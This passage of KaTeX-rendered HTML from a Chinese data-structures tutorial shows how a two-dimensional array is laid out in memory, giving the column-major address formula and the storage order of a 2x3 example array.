style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">2</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">2</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.1052em;vertical-align:-0.3552em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mspace">&nbsp;</span><span class="mord">∣</span><span class="mspace">&nbsp;</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mspace">&nbsp;</span><span class="mord">∣</span><span class="mspace">&nbsp;</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">2</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mspace">&nbsp;</span><span class="mord">∣</span><span class="mspace">&nbsp;</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mspace">&nbsp;</span><span class="mord">∣</span><span class="mspace">&nbsp;</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mspace">&nbsp;</span><span class="mord">∣</span><span class="mspace">&nbsp;</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">2</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p>当以列优先方式存储时，得出存储结构关系式为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>O</mi><mi>C</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi><mi>O</mi><mi>C</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mn>0</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">[</mo><mi>j</mi><mo>×</mo><mo stretchy="false">(</mo><msub><mi>h</mi><mn>1</mn></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mi>i</mi><mo stretchy="false">]</mo><mo>×</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">LOC(a_{i,j}) = LOC(a_{0,0}) + [j \times (h_{1} + 1) + i] \times L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.07153em;">OC</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.07153em;">OC</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span></p>
<p>例如，对于数组 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mrow><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo></mrow></msub></mrow><annotation encoding="application/x-tex">A_{[2][3]}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0385em;vertical-align:-0.3552em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">2</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">3</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span></span>，它 <strong>按列优先</strong> 方式在内存中的存储形式如下所示：</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>A</mi><mrow><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo></mrow></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mspace linebreak="newline"></mspace><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></msub><mtext>&nbsp;</mtext><mi mathvariant="normal">∣</mi><mtext>&nbsp;</mtext><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></msub><mtext>&nbsp;</mtext><mi mathvariant="normal">∣</mi><mtext>&nbsp;</mtext><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msub><mtext>&nbsp;</mtext><mi mathvariant="normal">∣</mi><mtext>&nbsp;</mtext><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msub><mtext>&nbsp;</mtext><mi mathvariant="normal">∣</mi><mtext>&nbsp;</mtext><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msub><mtext>&nbsp;</mtext><mi mathvariant="normal">∣</mi><mtext>&nbsp;</mtext><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msub></mrow><annotation encoding="application/x-tex">
A_{[2][3]} = \begin{bmatrix}
  a_{[0][0]} &amp; a_{[0][1]} &amp; a_{[0][2]} \\
  a_{[1][0]} &amp; a_{[1][1]} &amp; a_{[1][2]}
\end{bmatrix} \\
a_{[0][0]} \space | \space a_{[1][0]} \space | \space a_{[0][1]} \space | \space a_{[1][1]} \space | \space a_{[0][2]} \space | \space a_{[1][2]}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0385em;vertical-align:-0.3552em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">2</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">3</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">2</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">2</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.1052em;vertical-align:-0.3552em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mspace">&nbsp;</span><span class="mord">∣</span><span class="mspace">&nbsp;</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mspace">&nbsp;</span><span class="mord">∣</span><span class="mspace">&nbsp;</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mspace">&nbsp;</span><span class="mord">∣</span><span class="mspace">&nbsp;</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mspace">&nbsp;</span><span class="mord">∣</span><span class="mspace">&nbsp;</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">0</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">2</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mspace">&nbsp;</span><span class="mord">∣</span><span class="mspace">&nbsp;</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">2</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<h4> 特殊矩阵的压缩存储</h4>
<ul>
